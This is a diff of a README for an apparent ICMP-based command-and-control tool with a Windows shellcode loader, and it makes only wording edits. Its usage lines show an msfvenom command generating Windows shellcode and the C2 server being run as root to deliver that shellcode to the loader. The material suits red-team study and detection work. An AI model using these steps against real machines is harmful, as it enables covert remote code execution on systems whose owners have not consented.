@@ -18,10 +18,10 @@ The shellcode loader is developed for Windows and the C2 software for Linux syst
 <img src="https://user-images.githubusercontent.com/79810730/223784387-a94cffea-f29d-4463-97ef-067c42e40b95.PNG" alt="static compile" style="width:50%;"/>
 
 ## How to use
-- generate custom shellcode with msfvenom (it is important that the exitfunc is set to thread) i.e. ```msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f hex```
+- generate custom shellcode with msfvenom (it is important that the exitfunc is set to thread) e.g. ```msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f hex```
  
-- start the C2 software as root on your Linux system or your Linux VPS i.e. with ```./icmp-c2-server -a 64 -os win -sc <your shellcode>```
-- start the shellcode loader on your Windows and enjoy
+- start the C2 software as root on your Linux system or your Linux VPS e.g. with ```./icmp-c2-server -a 64 -os win -sc <your shellcode>```
+- start the shellcode loader on your Windows system and enjoy
 
 
 <img src="https://user-images.githubusercontent.com/79810730/223886417-9b944229-acb9-4a97-8107-2895e22adac5.gif" alt="example" style="width:80%;"/>
